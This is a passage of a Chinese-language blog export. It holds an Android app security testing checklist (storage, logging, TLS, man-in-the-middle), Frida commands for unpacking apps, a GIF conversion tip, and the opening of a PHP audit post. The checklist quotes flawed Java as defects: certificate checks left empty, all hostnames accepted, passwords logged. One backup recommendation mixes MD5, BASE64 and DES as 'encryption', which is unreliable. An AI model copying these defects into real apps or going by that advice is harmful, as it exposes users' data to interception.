href="#注销过程测试" class="headerlink" title="注销过程测试"></a>注销过程测试</h2><p><a id="org643d8f5"></a></p><h3 id="重新注册检测"><a href="#重新注册检测" class="headerlink" title="重新注册检测"></a>重新注册检测</h3><ol><li><p>检测目的</p><p> 检测在客户端注销后，使用相同账户能否重新注册</p></li><li><p>检测方法</p><ol><li> 检测客户端是否存在注销功能</li><li> 在客户单注销之后，使用相同账户注册，查看是否可以重新注册，测试第三方关联的账户是否也已经注销，还能否正常登陆</li></ol></li><li><p>检测结论</p><p> 若注销账户后仍可以使用相同的账户注册，关联的第三方数据无法使用，则通过测试</p></li><li><p>修复建议</p><p> 在客户端注销操作后，可以使用相同账户重新注册，确认原来的账户信息已经清除</p></li></ol><p><a id="org0942197"></a></p><h3 id="数据清除检测"><a href="#数据清除检测" class="headerlink" title="数据清除检测"></a>数据清除检测</h3><ol><li><p>检测目的</p><p> 检测在App卸载后，本地存储的数据或账户缓存等信息是否全部清除</p></li><li><p>检测方法</p><ol><li> 安装App，先注册，登录试用，然后卸载，查看本地注册的用户账户信息等数据是否及时删除</li><li> 重新安装App，查看使用之前的账户和密码是否可以直接登陆</li></ol></li><li><p>检测结论</p><p> 若卸载App后，本地数据完全及时清除，则通过测试</p></li><li><p>修复建议</p><p> 在App卸载后，及时删除本地存储的全部数据</p></li></ol><p><a id="org8c9cd3a"></a></p><h1 id="本地数据安全测试-内存数据、本地存储"><a href="#本地数据安全测试-内存数据、本地存储" class="headerlink" title="本地数据安全测试 - 内存数据、本地存储"></a>本地数据安全测试 - 内存数据、本地存储</h1><p><a id="org0bb8c18"></a></p><h2 id="数据创建测试"><a href="#数据创建测试" class="headerlink" title="数据创建测试"></a>数据创建测试</h2><p><a id="org2f44160"></a></p><h3 id="用户协议检测"><a href="#用户协议检测" class="headerlink" title="用户协议检测"></a>用户协议检测</h3><ol><li><p>检测目的</p><p> 检测App是否存在用户协议声明。若存在，是否对使用用户信息用户及保护措施进行声明，是否存在违规行为</p></li><li><p>检测方法</p><ol><li> 安装运行App，试用App的所有主要功能，并抓包，通过数据包和源代码了解其行为特征</li><li> 查看是否存在用户协议，以及协议内容是否声明App需要手机的用户信息及保护措施</li></ol></li><li><p>检测结论</p><p> 若App存在用户服务协议，且声明了用户信息用途及保护措施，则通过测试</p></li><li><p>修复建议</p><p> App手机用户个人信息前，必须在用户服务协议中声明，需要收集用户设备的哪些信息、具体用途、及保护用户信息的安全措施和具体承诺</p></li></ol><p><a id="orgba2f37e"></a></p><h3 id="数据采集检测"><a href="#数据采集检测" class="headerlink" title="数据采集检测"></a>数据采集检测</h3><ol><li><p>检测目的</p><p> 检测App是否过度申请系统敏感权限，使用该权限时是否提示用户授权，是否过度手机用户数据，数据传输过程是否安全</p></li><li><p>检测方法</p><ol><li> 查看AndroidManifest.xml文件<users-permission>标签，分析App所申请的系统权限，是否存在过度申请的敏感权限</li><li> 查看App调用系统的敏感权限时是否提示用户授权</li><li> 分析App源码及数据包内容，查看是否过度收集在用户协议声明范围外的用户数据，确认数据传输过程中的安全性</li></ol></li><li><p>检测结论</p><p> 若App无过度申请系统敏感权限，且在使用该权限时提示用户授权，同时没有过度收集用户数据，则通过测试</p></li><li><p>修复建议</p><p> App发布时需要删除不需要的系统敏感权限，在申请系统敏感权限时，需要提示用户授权，不得私自上传在协议中未声明的用户信息</p></li></ol><p><a id="orga315219"></a></p><h3 id="数据输入检测"><a href="#数据输入检测" class="headerlink" title="数据输入检测"></a>数据输入检测</h3><ol><li><p>检测目的</p><p> 检测App是否实现了自带的安全键盘，且启动键盘时数字是否随机分布，关键的输入框是否禁用复制粘贴功能，是否存在验证码校验机制，验证码是否安全</p></li><li><p>检测方法</p><ol><li> 检测App是否实现了自定义软键盘，在每次启动时按键数字随机分布，且按键时不存在按键阴影，按键回显等特效</li><li> 检测要求输入敏感数据(登陆密码、支付密码、银行卡账户等)输入框禁用复制粘贴功能</li><li> 检测验证码是否由图形验证码或短信验证码组成，是否通过服务器端返回给客户端</li></ol></li><li><p>检测结论</p><p> 若App实现了自定义软键盘，键盘数字实现了随机分布，具有安全的验证码，同时密码输入框禁用了复制粘贴功能，则通过测试</p></li><li><p>修复建议</p><ul><li>  App客户端实现自定义的软键盘，软键盘每次启动时都要随机分布，且按键无回显、阴影等特效</li><li>  要求输入登陆、支付密码、银行卡账户等输入框禁用复制粘贴功能 设置 <code>android:longClickable=&quot;false&quot;</code> 关闭其功能</li><li>  增加复杂图形验证码或短信验证码，且在传输过程中对数据进行加密</li></ul></li></ol><p><a id="orga14671a"></a></p><h3 id="数据生成检测"><a href="#数据生成检测" class="headerlink" title="数据生成检测"></a>数据生成检测</h3><ol><li><p>检测目的</p><p> 检测App生成数据的存储形式时是结构话还是非结构话，数据是否经过加密后存储</p></li><li><p>检测方法</p><ol><li> 检测App生成的结构化数据，要求数据内容加密后存储</li><li> 检测App生成的非结构化数据，要求数据内容加密后存储</li></ol></li><li><p>检测结论</p><p> 若本地存储的数据经过加密处理，则通过测试</p></li><li><p>修复建议</p><p> 不管生成的数据是采用结构化还是非结构化形式存储，都要求加密后存储</p></li></ol><p><a id="org0e9c3ed"></a></p><h2 id="数据存储测试"><a href="#数据存储测试" class="headerlink" title="数据存储测试"></a>数据存储测试</h2><p><a id="org9fc890b"></a></p><h3 id="访问控制检测"><a href="#访问控制检测" class="headerlink" title="访问控制检测"></a>访问控制检测</h3><ol><li><p>检测目的</p><p> 检测App是否具备完善的权限管理机制，是否能够与其他App隔离，是否在权限允许的范围之外存在数据被其他客户端访问的风险</p></li><li><p>检测方法</p><p> 查看App本地存储文件的权限</p><pre><code> ls -al files        # 本地存储file文件权限 ls -al shared_pref  # 本地存储xml文件权限 ls -al app_webview  # 本地存储的cache文件权限 ls -al databases    # 本地存储的db文件权限</code></pre></li><li><p>检测结论</p><p> 如客户端具备完善的权限管理机制，以最小权限为原则，则通过测试</p></li><li><p>修复建议</p><p> App客户端严格控制本地生成敏感数据访问权限，避免被第三方App非法访问导致用户信息泄露</p></li></ol><p><a id="org717a8be"></a></p><h3 id="数据加密检测"><a href="#数据加密检测" class="headerlink" title="数据加密检测"></a>数据加密检测</h3><ol><li><p>检测目的</p><p> 检测App在本地存储的用户信息是否经过了加密处理，加密密钥是否进行了保护，加密算法是否合理，生成的随机数强度是否较高，避免造成用户信息泄露风险</p></li><li><p>检测方法</p><p> 检测App在本地生成的数据文件是否加密，检测App在本地存储的文件是否加密</p></li><li><p>检测结论</p><p> 若本地数据进行了加密处理，加密密钥进行了保护处理，且采用多种加密算法组合加密，对不同的数据采用了不同的加密算法，采用安全的方式生成随机数，则通过测试</p></li><li><p>修复建议</p><ul><li>  对App在本地存储的用户信息进行加密处理</li><li>  对对称加密算法的加密密钥进行加密保护和隐藏处理</li><li>  对APp在本地存储的用户信息进行多重加密，并对用户数据采用多种加密方式</li><li>  避免使用不安全的随机数生成类</li><li>  避免使用不安全的加密算法</li></ul></li></ol><p><a id="org80440e9"></a></p><h2 id="数据处理测试"><a href="#数据处理测试" class="headerlink" title="数据处理测试"></a>数据处理测试</h2><p><a id="org428e884"></a></p><h3 id="程序日志检测"><a href="#程序日志检测" class="headerlink" title="程序日志检测"></a>程序日志检测</h3><ol><li><p>检测目的</p><p> 检测App源码中的调试信息是否关闭，在调试信息中是否写入敏感信息</p></li><li><p>检测方法</p><ol><li><p>反编译源码，查看是否存在日志调试代码，要求不得存在日志调试代码</p><pre><code> private void save()&#123;     String mName=etUsername.getText().toString();     String mPwd=etPwd.getText().toString();     mEditor.putString(&quot;Name&quot;,mName);     mEditor.putString(&quot;Pwd&quot;,mPwd);     mEditor.commit();     Log.d(&quot;TEST&quot;,&quot;本地存储&quot;+&quot;用户名&quot;+mName+&quot;密码&quot;+mPwd); &#125;</code></pre></li><li><p> 动态运行App客户端，使用<del>logcat</del>查看后台打印日志是否存在用户敏感数据，要求后台不得打印日志调试信息</p></li></ol></li><li><p>检测结论</p><p> 若App关闭了源码中的调试信息，则通过测试</p></li><li><p>修复建议</p><p> App发布时应删除源码中的日志调试代码</p></li></ol><p><a id="orge80508d"></a></p><h3 id="敏感数据不当使用检测"><a href="#敏感数据不当使用检测" class="headerlink" title="敏感数据不当使用检测"></a>敏感数据不当使用检测</h3><ol><li><p>检测目的</p><p> 检测App源码和行为特征是否符合App安全相关标准的规定</p></li><li><p>检测方法</p><p> 反编译App代码，查看是否私自手机用户敏感信息，抓包拦截，检测是App是否私自上传用户隐私到服务器</p></li><li><p>检测结论</p><p> 逆向分析源码和数据包，若符合App安全相关标准的规定，则通过测试</p></li><li><p>修复建议</p><p> App源码要进行严格审核处理，禁止在用户未知情的情况下私自收集用户信息</p></li></ol><p><a id="org203f9e0"></a></p><h2 id="数据共享测试"><a href="#数据共享测试" class="headerlink" title="数据共享测试"></a>数据共享测试</h2><p><a id="orgdcc9854"></a></p><h3 id="第三方SDK用户协议检测"><a href="#第三方SDK用户协议检测" class="headerlink" title="第三方SDK用户协议检测"></a>第三方SDK用户协议检测</h3><ol><li><p>检测目的</p><p> 检测在App服务协议中是否声明第三方SDK收集用户信息的用途，是否过度收集用户个人信息</p></li><li><p>检测方法</p><p> 查看用户协议内容是否声明共享用户信息给第三方SDK，并通过抓包查看第三方SDK的行为特征</p></li><li><p>检测结论</p><p> 若用户协议中明确声明App信息与第三方共享情况，则通过测试</p></li><li><p>修复建议</p><p> App要明确声明是否会与第三方共享用户信息，以及共享用户信息的具体用途</p></li></ol><p><a id="org4e8592a"></a></p><h3 id="与第三方SDK数据共享检测"><a href="#与第三方SDK数据共享检测" class="headerlink" title="与第三方SDK数据共享检测"></a>与第三方SDK数据共享检测</h3><ol><li><p>检测目的</p><p> 检测App是否在用户未知情的情况下，私自共享用户个人信息给第三方SDK，以及第三方SDK是否私自收集用户个人信息到指定服务器</p></li><li><p>检测方法</p><ol><li> 分析App源码和数据包，查看是否在用户未知情的情况下，将收集的用户信息私自上传至第三方服务器</li><li> 分析App嵌入的第三方SDK源码和数据包，查看是否存在第三方SDK在用户不知情的情况下，将收集的用户信息私自上传至第三方服务器</li></ol></li><li><p>检测结论</p><p> 若分析源码内容和数据包后，符合App安全相关标准的规定，则通过测试</p></li><li><p>修复建议</p><p> 在App共享数据给第三方SDK的服务协议之外，禁止App和第三方SDK私自采用短信或数据包等形式，收集用户信息并上传到指定服务器</p></li></ol><p><a id="orgdbf7381"></a></p><h2 id="数据备份测试"><a href="#数据备份测试" class="headerlink" title="数据备份测试"></a>数据备份测试</h2><p><a id="orgbd332d3"></a></p><h3 id="敏感数据备份检测"><a href="#敏感数据备份检测" class="headerlink" title="敏感数据备份检测"></a>敏感数据备份检测</h3><ol><li><p>检测目的</p><p> 检测App应用数据是否可以备份，是否能够防止攻击者复制App数据</p></li><li><p>检测方法</p><p> 查看Androidmanifest.xml文件中的allowBackup属性是否为true<br> <code>&lt;application android:allowBackup=&quot;true&quot;</code></p></li><li><p>检测结论</p><p> 在App不具备备份功能的情况下，若 <code>&lt;application android:allowBackup=&quot;false&quot;</code> 则通过测试</p></li><li><p>修复建议</p><p> 在App不具备备份功能的情况下，应将 <code>&lt;application android:allowBackup=&quot;false&quot;</code> </p></li></ol><p><a id="org1c7a1d8"></a></p><h3 id="备份数据加密强度检测"><a href="#备份数据加密强度检测" class="headerlink" title="备份数据加密强度检测"></a>备份数据加密强度检测</h3><ol><li><p>检测目的</p><p> 检测App备份的数据是否进行加密处理，并且要求使用复杂的加密强度高的算法</p></li><li><p>检测方法</p><p> 若采用对称算法加密，则判断对称算法的密码是否存储安全，加密算法的源代码是否可以被破解</p></li><li><p>检测结论</p><p> 若App备份的数据进行了加密处理，则通过测试</p></li><li><p>修复建议</p><p> 采用多种混合算法加密，例如AES256,MD5,HASH,DES,BASE64</p></li></ol><p><a id="org1c83575"></a></p><h2 id="数据销毁测试"><a href="#数据销毁测试" class="headerlink" title="数据销毁测试"></a>数据销毁测试</h2><p><a id="org8a07238"></a></p><h3 id="后台运行数据检测"><a href="#后台运行数据检测" class="headerlink" title="后台运行数据检测"></a>后台运行数据检测</h3><ol><li><p>检测目的</p><p> 检测App客户端在切入后台运行时是否对收集存储的文件、数据库、配置文件、缓存文件等进行及时清理操作</p></li><li><p>检测方法</p><ol><li> App切入后台运行时，查看本地生成的db文件、xml文件或者内存中的数据是否进行了删除</li><li> 导出本地的缓存信息文件，查看是否有敏感信息暴露</li></ol></li><li><p>检测结论</p><p> 若App在切入后台运行时，本地生成的临时文件db、xml、cache中的数据或者运行时内存中的用户数据做到了及时清理，则通过测试</p></li><li><p>修复建议</p><p> App在切入后台运行后，应及时清理本地存储的用户敏感信息和内存中的数据信息</p></li></ol><p><a id="org57b8027"></a></p><h3 id="敏感数据清除检测"><a href="#敏感数据清除检测" class="headerlink" title="敏感数据清除检测"></a>敏感数据清除检测</h3><ol><li><p>检测目的</p><p> 检测App在退出或被卸载时，是否彻底删除在手机本地存储的文件、数据库、缓存、配置信息等文件</p></li><li><p>检测方法</p><p> 使用反编译工具apktool对目标文件进行反编译，查看App代码中是否具有清除缓存信息的方法 <code>removeSessionCookie()/deleteCookie()</code></p><pre><code> if(&quot;ClearWebView&quot; , &quot;webView.clearCache&quot;)&#123;     try&#123;         CookieSyncManager.createInstance(this.Y.getApplicationContext());         CookieSyncManager.getInstance().removeSessionCookie();         CookieSyncManager.getInstance().sync();     &#125;catch(Exception v0_1)&#123;     &#125; &#125;</code></pre></li><li><p>检测结论</p><p> 若本地生成文件仍然存在，则本项测试 <strong>不通过</strong></p></li><li><p>修复建议</p><p> 检测App在退出或被卸载时，应彻底删除在手机本地存储的文件、数据库、缓存、配置信息等信息</p></li></ol><p><a id="org3894cd3"></a></p><h1 id="网络传输安全测试-网络通信"><a href="#网络传输安全测试-网络通信" class="headerlink" title="网络传输安全测试 - 网络通信"></a>网络传输安全测试 - 网络通信</h1><p><a id="org2412456"></a></p><h2 id="安全传输层测试"><a href="#安全传输层测试" class="headerlink" title="安全传输层测试"></a>安全传输层测试</h2><p><a id="orgefeec07"></a></p><h3 id="TLS实现检测"><a href="#TLS实现检测" class="headerlink" title="TLS实现检测"></a>TLS实现检测</h3><ol><li><p>检测目的</p><p> 检测客户端与服务器端交互核心的通信会话是否采用HTTPS，同时是否为现有最佳实践方式</p></li><li><p>检测方法</p><p> 使用Burpsuite/Wireshark抓包，判定用户登录、交易等私密连接是否使用HTTPS进行网络通信，查看TLS版本是否高于1.0</p></li><li><p>检测结论</p><p> 若客户端与服务器端通信采用HTTPS，且TLS版本高于1.0，则通过测试</p></li><li><p>修复建议</p><p> 客户端与服务器端核心的通信会话均采用HTTPS，同时TLS版本高于1.0</p></li></ol><p><a id="orgfb44226"></a></p><h3 id="CA证书检测"><a href="#CA证书检测" class="headerlink" title="CA证书检测"></a>CA证书检测</h3><ol><li><p>检测目的</p><p> 检测客户端与服务器建立安全通道时，客户端是否验证远程端点的X.509证书，是否只接受受信任的CA签名证书</p></li><li><p>检测方法</p><p> 检测CA证书的合法性，是否为受信任的CA签名证书，App是否只接受受信任的CA签名证书</p><ol><li> 抓取App与服务器端交互的数据，校验证书的颁发机构</li><li> 在源码中检查客户端是否只接受受信任的CA签名证书</li></ol></li><li><p>检测结论</p><p> 若截获的数据包中证书由可信任机构签发，且在有效期内，且访问服务器与证书绑定的一致，同时只接受信任的CA签名证书，则通过测试</p></li><li><p>修复建议</p><p> 客户端验证远程端点的X.509证书，只接受受信任的CA签名的证书</p></li></ol><p><a id="org090d933"></a></p><h3 id="证书校验检测"><a href="#证书校验检测" class="headerlink" title="证书校验检测"></a>证书校验检测</h3><ol><li><p>检测目的</p><p> 检测客户端和服务器是否对证书进行双向校验</p></li><li><p>检测方法</p><ol><li>反编译App代码，检测是否存在客户端验证服务器端证书的代码<ul><li>  验证证书内容有效性、数字摘要是否一致</li></ul></li><li> 反编译App代码，检测是否存在客户端发送本地证书给服务器端认证的代码</li></ol></li><li><p>检测结论</p><p> 若客户端对服务器端返回的证书进行了验证，同时服务器端也对客户端证书进行了校验，则通过测试</p></li><li><p>修复建议</p><p> 建议一般的App要实现客户端对服务器端证书的单向验证，对于安全要求比较高的App，要实现客户端与服务器端证书的双向验证</p></li></ol><p><a id="org467e66d"></a></p><h3 id="主机名校验"><a href="#主机名校验" class="headerlink" title="主机名校验"></a>主机名校验</h3><ol><li><p>检测目的</p><p> 检测客户端是否对主机名进行校验</p></li><li><p>检测方法</p><p> 反编译App代码，查找App通信的代码，查看 <code>setHostnameVerifier()</code> 方法接受任意域名还是进行了主机名验证</p><pre><code> public static SSLSocketFactory getFixedSocketFactory()&#123;     MySSLSocketFactory v0;     try&#123;         v0=new MySSLSocketFactory(MySSLSocketFactory.getKeystore());         //缺陷代码         ((SSLSocketFactory)v0).setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);     &#125;catch(Throwable v1)&#123;         v1.printStackTrace();         SSLSocketFactory v0_1 = SSLSocketFactory.getSocketFactory();     &#125;     return ((SSLSocketFactory)v0); &#125;</code></pre></li><li><p>检测结论</p><p> 若App接受任意域名，则本项测试 <strong>不通过</strong></p></li><li><p>修复建议</p><p> App对主机名进行校验，不能接受任意域名</p></li></ol><p><a id="org764d1f9"></a></p><h2 id="数据加密检测-1"><a href="#数据加密检测-1" class="headerlink" title="数据加密检测"></a>数据加密检测</h2><p><a id="org9f7544e"></a></p><h3 id="检测目的-1"><a href="#检测目的-1" class="headerlink" title="检测目的"></a>检测目的</h3><p>检测在客户端与服务器端通信过程中，业务数据是否以明文方式在网络中传输，数据加密的复杂度如何</p><p><a id="orgb800ad3"></a></p><h3 id="检测方法-1"><a href="#检测方法-1" class="headerlink" title="检测方法"></a>检测方法</h3><ol><li> 对客户端与服务器端通信的登陆、支付、转账等核心功能进行抓包，查看业务数据是否以明文方式在网络中传输</li><li> 检测数据加密方式的复杂度，url编码、Base64编码、AES\DES加密等</li></ol><p><a id="orgbdb1f45"></a></p><h3 id="检测结论-1"><a href="#检测结论-1" class="headerlink" title="检测结论"></a>检测结论</h3><p>若客户端与服务器端交互的业务数据经过多个复杂的算法加密，且无法破解，则通过测试</p><p><a id="orgace36cd"></a></p><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>客户端与服务器端交互的上行/下行数据要经过多个复杂算法进行加密，同时加密存储对称加密算法密钥</p><p><a id="org30371d5"></a></p><h2 id="中间人攻击测试"><a href="#中间人攻击测试" class="headerlink" title="中间人攻击测试"></a>中间人攻击测试</h2><p><a id="orgb561cf4"></a></p><h3 id="HTTP中间人会话劫持检测"><a href="#HTTP中间人会话劫持检测" class="headerlink" title="HTTP中间人会话劫持检测"></a>HTTP中间人会话劫持检测</h3><ol><li><p>检测目的</p><p> 检测客户端与服务器端交互的数据是否可以被任意篡改，导致重放攻击漏洞</p></li><li><p>检测方法</p><p> 运行测试App，点击登陆，拦截数据包，并进行修改后放行，查看App运行结果是否能够修改成功</p></li><li><p>检测结论</p><p> 若客户端与服务器端交互的数据经过加密处理，且数据无法修改，则通过测试</p></li><li><p>修复建议</p><ul><li>  采用高强度的加密算法对交互数据进行加密/或使用HTTPS</li><li>  对客户端请求的数据和服务器端返回的数据进行完整性校验，防止被篡改</li></ul></li></ol><p><a id="org493ff20"></a></p><h3 id="HTTPS中间人会话劫持检测"><a href="#HTTPS中间人会话劫持检测" class="headerlink" title="HTTPS中间人会话劫持检测"></a>HTTPS中间人会话劫持检测</h3><ol><li><p>检测目的</p><p> 检测App在使用HTTPS时，是否存在中间人攻击漏洞</p></li><li><p>检测方法</p><ol><li><p>反编译源码，查看是否校验服务器端是否可信- 查看实现X509TrustManager接口中 <code>checkServerTrusted()</code> 方法实现是否为空</p><pre><code> public MySSLSocketFactory(KeyStore truststore) throws NoSuchAlgorithmException,                                                       KeyManagementException&#123;     this.sslContext = SSLContext.getInstance(&quot;TLS&quot;);     this.sslContext.init(null,new TrustManager[]&#123;new X509TrustManager()&#123;             public X509Certificate[] getAcceptedIssuers()&#123;                 return null;             &#125;             public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException&#123;                 //实现逻辑为空             &#125;             public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException&#123;                 //实现逻辑为空             &#125;         &#125;&#125;,null); &#125;</code></pre></li><li><p>反编译源码，查看站点域名与站点证书的域名是否匹配- 查看 <code>HostnameVerifier()</code> 方法中的 <code>verify()</code> 函数是否存在域名校验</p><p> NetworkUtils.conn=null;<br> NetworkUtils.is =null;<br> NetworkUtils.os=null;<br> NetowrkUtils.DO_NOT_VERIFY = new HostanmeVerifier(){</p><pre><code>     public boolean verify(String s, SSLSession sslSession)&#123;         return 1; // 不检查站点域名和站点证书的域名     &#125; &#125;</code></pre></li><li><p>查看 <code>sethostnameverifier()</code> 方法是否接受任意域名</p><pre><code> public static SSLSocketFactory getFixedSocketFactory()&#123;     MySSLSocketFactory v0;     try&#123;         v0=new MySSLSocketFactory(MySSLSocketFactory.getKeystore());         //缺陷代码         ((SSLSocketFactory)v0).setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);     &#125;catch(Throwable v1)&#123;         v1.printStackTrace();         SSLSocketFactory v0_1 = SSLSocketFactory.getSocketFactory();     &#125;     return null; &#125;</code></pre></li></ol></li><li><p>检测结论</p><p> 若客户端不进行服务器端是否可信、不进行域名校验、接受任意域名，对APP数据包进行拦截和篡改，则造成中间人攻击的风险。<br> 若客户端对服务器端返回的SSL证书进行强校验，则通过测试</p></li><li><p>修复建议</p><p> 对SSL证书进行签名CA是否合法、证书是否自签名、主机域名是否匹配、证书是否过期等校验。</p></li></ol><p><a id="org5b71f45"></a></p><h1 id="App加固技术"><a href="#App加固技术" class="headerlink" title="App加固技术"></a>App加固技术</h1><ol><li><p>第一代加固技术： 通过对源码进行</p><ul><li>  压缩： 检测并一处代码中无用的类、字段、方法和特性</li><li>  优化： 对字节码进行优化，移除无用指令</li><li>  混淆： 使用a、b、c、d等无意义字符对类、字段、方法进行重命名</li><li>  预检： 在Java平台上对处理后的代码进行预检，确保加载的class文件时可执行</li></ul></li><li><p> 第二代加固技术： 对原始App的dex文件加密，并外包一层克，将App的核心代码进行隐藏</p></li><li><p> 第三代加固技术： 对dex文件中所有的类及方法函数内容进行抽取、加密和隐藏，单独加密后存放在apk中的特定文件内</p></li><li><p> 第四代加固技术： DVMP(dex虚拟机保护) 具有自定义虚拟机、指令集和解释器，未保护的代码在系统虚拟机中运行，保护代码在自定义虚拟机运行</p></li></ol><h1 id="Table-of-Contents-1"><a href="#Table-of-Contents-1" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org775b335">应用脱壳</a><ol><li> <a href="#org8b17b93">安装Frida客户端</a></li></ol></li></ol><p><a id="org775b335"></a></p><h1 id="应用脱壳"><a href="#应用脱壳" class="headerlink" title="应用脱壳"></a>应用脱壳</h1><p><a id="org8b17b93"></a></p><h2 id="安装Frida客户端"><a href="#安装Frida客户端" class="headerlink" title="安装Frida客户端"></a>安装Frida客户端</h2><ol><li><p>在Android上安装<a href="https://github.com/frida/frida/releases">Frida Server</a></p><pre><code> adb shell getprop ro.build.version.release     # 获取Android版本号 adb shell getprop ro.product.cpu.abi           # 查看CPU架构,根据架构下载对应的frida-server-14.2.18-android-arm64.xz xz -d frida-server-14.2.18-android-arm64.xz    # 解压frida-server adb push frida-server-14.2.18-android-arm64 /data/local/tmp      # 传输到/data/local/tmp目录下 adb shell su chmod a+x /data/local/tmp/frida-server-14.2.18-android-arm64 adb forward tcp:27042 tcp:27042 adb forward tcp:27043 tcp:27043 ./frida-server-14.2.18-android-arm64 python dexDump.py com.test.aspiredoctor</code></pre></li><li><p>在macOS上安装Frida Client</p><pre><code> pip3 install frida frida-tools</code></pre></li></ol><h1 id="Footnotes"><a href="#Footnotes" class="headerlink" title="Footnotes"></a>Footnotes</h1><p><sup><a id="fn.1" href="#fnr.1">1</a></sup> 替换Android系统/system/bin/app<sub>process文件</sub></p><p><sup><a id="fn.2" href="#fnr.2">2</a></sup> 如apk文件和dex文件</p><p><sup><a id="fn.3" href="#fnr.3">3</a></sup> 可导致调用系统功能截取屏幕和录像窃取用户信息，界面劫持，对用户进行钓鱼</p><p><sup><a id="fn.4" href="#fnr.4">4</a></sup> 检测客户端程序是否对已经root的android系统、模拟器和逆向框架进行检测</p><p><sup><a id="fn.5" href="#fnr.5">5</a></sup> 检测客户端程序是否进行代码加密、代码混淆和代码加固，是否易被逆向并泄露程序的设计原理和运行流程</p><p><sup><a id="fn.6" href="#fnr.6">6</a></sup> 检测客户程序是否对自身进行校验</p><p><sup><a id="fn.7" href="#fnr.7">7</a></sup> 检测客户端程序是否可被外部程序动态调试并输出敏感信息</p><p><sup><a id="fn.8" href="#fnr.8">8</a></sup> 检测客户端程序是否存在进程保护和内存保护，防止被外部程序动态注入so文件到指定进程、以及任意修改、转储内存代码行为</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Evolution </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>如何将视频转化为Gif</title>
      <link href="Tools/%E5%A6%82%E4%BD%95%E5%B0%86%E8%A7%86%E9%A2%91%E8%BD%AC%E5%8C%96%E4%B8%BAGif.html"/>
      <url>Tools/%E5%A6%82%E4%BD%95%E5%B0%86%E8%A7%86%E9%A2%91%E8%BD%AC%E5%8C%96%E4%B8%BAGif.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#orgc4eb406">How to convert .mov or .mp4 to .gif using the command line</a><ol><li> <a href="#org3e63297">How to convert</a></li></ol></li></ol><p><a id="orgc4eb406"></a></p><h1 id="How-to-convert-mov-or-mp4-to-gif-using-the-command-line"><a href="#How-to-convert-mov-or-mp4-to-gif-using-the-command-line" class="headerlink" title="How to convert .mov or .mp4 to .gif using the command line"></a>How to convert .mov or .mp4 to .gif using the command line</h1><p>Requirements</p><pre><code>brew install ffmpegbrew install gifsicle</code></pre><p><a id="org3e63297"></a></p><h2 id="How-to-convert"><a href="#How-to-convert" class="headerlink" title="How to convert"></a>How to convert</h2><pre><code>ffmpeg -i in.mov -s 600x400 -pix_fmt rgb24 -r 10 -f gif - | gifsicle --optimize=3 --delay=3 &gt; out.gif</code></pre><p>Arguments:</p><pre><code>-r 10 to reduce the frame rate from 25 fps to 10 fps-s 600x400 to determine the output size.--delay=3 to have a delay of 30ms between each gif--optimize=3 to use the most file-size optimized algorithm</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计</title>
      <link href="Coding/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html"/>
      <url>Coding/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org0fff461">PHP Audit</a><ol><li> <a href="#org8eab023">代码审计常见思路</a></li><li> <a href="#orgd90071d">Untrusted Data ,使用不可信的数据</a></li><li> <a href="#org593992a">Command Execution, 命令执行</a></li><li> <a href="#orgaf7a00a">Code Execution, 代码执行</a></li><li> <a href="#org00773a4">Information Discloure, 信息泄露</a></li><li> <a href="#org9c1cc21">Insecure Cryptographic Functions, 不安全的加密函数</a></li></ol></li><li><a href="#org7fd6349">常见危险函数</a><ol><li> <a href="#orgd42787f">代码执行函数</a></li><li> <a href="#orga4dc3ae">包含函数</a></li><li> <a href="#orgb5e23c0">命令执行函数</a></li><li> <a href="#org7b93cfd">文件操作函数</a></li><li> <a href="#org8ef722f">特殊函数</a></li><li> <a href="#orgabca0d4">变量覆盖</a></li></ol></li></ol><p><a id="org0fff461"></a></p><h1 id="PHP-Audit"><a href="#PHP-Audit" class="headerlink" title="PHP Audit"></a>PHP Audit</h1><p><a href="https://github.com/ripsscanner/rips">RIPS</a>  <a href="https://github.com/nccgroup/VCG">VCG</a></p><p>代码审计本质： <code>unfilter_function(param_input)</code><br>找漏洞 -&gt; 找可以控制的变量(参数)=param<sub>input</sub>= -&gt; 危险函数(param<sub>input</sub>)</p><p>漏洞形成条件：</p><ul><li>  可以控制的变量(外部输入)       &#x2013;&gt;  内因</li><li>  危险(未过滤参数)函数接收外部输入 &#x2013;&gt; 决定漏洞的类型</li></ul><p>隐式输入： 用户传递数据-&gt; 数据库/缓存文件等地方 -&gt; 